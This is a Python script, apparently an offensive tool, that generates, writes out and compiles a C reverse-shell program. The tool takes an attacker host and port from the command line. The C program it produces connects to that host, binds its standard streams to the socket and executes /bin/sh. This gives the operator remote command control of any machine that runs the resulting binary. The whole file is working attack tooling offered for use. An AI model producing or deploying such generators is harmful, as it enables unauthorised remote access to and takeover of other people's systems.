#!/usr/bin/python3

import os
from time import sleep
import sys

class bcolors:

    BLUE = '\033[94m'
    GREEN = '\033[92m'
    RED = '\033[31m'
    YELLOW = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    BGRED = '\033[41m'
    WHITE = '\033[37m'

banner = """
   ________  __    __    _______   ____     ____    _______   __    _____  ___   
  /"      ")/" |  | "\  /" __   ) /  " \   /  " \  |   _  "\ |" \  ( "   \|"  \  
 (:   //\_/(:  (__)  :)(__/ _) .//__|| |  /__|| |  (. |_)  :)||  | |.\    \    | 
  \___ \    \/      \/     /  //    |: |     |: |  |:     \/ |:  | |: \.   \   | 
  __ |  \   //  __   \  __ \_  \   _\  |    _\  |  (|  _  \  |.  | |.  \    \. | 
 /" \/  :) (:  (  )  :)(: \__) :\ /" \_|\  /" \_|\ |: |_)  :)/\  |\|    \    \ | 
(_______/   \__|  |__/  \_______)(_______)(_______)(_______/(__\_|_)\___|\____\) 
                                                                                 
"""

def init():
    print(bcolors.RED)    
    print(banner)
    print(bcolors.ENDC)
    print(bcolors.GREEN)
    text = "ReverseShell Binary Auto generater in C language\n\n"

    for i in text:
        print(i,end="",flush=True)
        sleep(0.02)

    del text
    print(bcolors.ENDC)
    if len(sys.argv) != 3:
        
        print(bcolors.RED)

        print("[!]More Args!!!!!!")
        print(f"[+]Usage: {sys.argv[0]} <lhost> <lport>")
        print(bcolors.ENDC)
        
        sys.exit()

def step1():
    lhost = sys.argv[1]
    lport = sys.argv[2]

    array = [lhost,lport]
    counter = 0

    for i in array:
        if len(i) > counter:
            counter = len(i)

    max_length = counter
    hatch = "+"+"-"*counter+"+"
    diff = max_length - len(lport)

    print(hatch)
    print(f"|{lhost}|<---LHOST")
    print(f"|{lport}"+" "*diff+"|<---LPORT")
    print(hatch)

    del array,counter,max_length,hatch,diff

    allow_range = [p for p in range(1,65536)]
    
    print(bcolors.RED)
    if int(lport) not in allow_range:
        print("[!]Invalid Number")
        print("[+]Port number: 1 - 65535")
        
        sys.exit()
    del allow_range
    return lhost,lport
    print(bcolors.ENDC)

def step2(lhost,lport):
    
    file_name = "shell.c"
    f = open(file_name,"w")
    f.write("#include <stdlib.h>\n")
    f.write("#include <unistd.h>\n")
    f.write("#include <netinet/in.h>\n")
    f.write("#include <arpa/inet.h>\n\n")
    f.write("int main(void){\n")
    f.write(f"\tint port = {int(lport)};\n")
    f.write("\tstruct sockaddr_in revsockaddr;\n\n")
    f.write("\tint sockt = socket(AF_INET, SOCK_STREAM, 0);\n")
    f.write("\trevsockaddr.sin_family = AF_INET;\n")
    f.write("\trevsockaddr.sin_port = htons(port);\n")
    f.write(f"\trevsockaddr.sin_addr.s_addr = inet_addr(\"{lhost}\");\n\n")
    f.write("\tconnect(sockt, (struct sockaddr *) &revsockaddr,\n")
    f.write("\tsizeof(revsockaddr));\n")
    f.write("\tdup2(sockt, 0);\n")
    f.write("\tdup2(sockt, 1);\n")
    f.write("\tdup2(sockt, 2);\n\n")
    f.write("\tchar * const argv[] = {\"/bin/sh\", NULL};\n")
    f.write("\texecve(\"/bin/sh\", argv, NULL);\n\n")
    f.write("\treturn 0;\n")
    f.write("}")
    f.close()
    
    print("[+]SourceCode Generated")


    del f
    return file_name
    

def step3(file_name):

    try:    
        os.system(f"gcc {file_name} -o shell ")
        
    except:
        print("[!]Fail")
        sys.exit()

    print("[+]Compile....Done")

if __name__ == "__main__":

    init()
    lhost,lport = step1()
    file_name = step2(lhost,lport)
    step3(file_name)

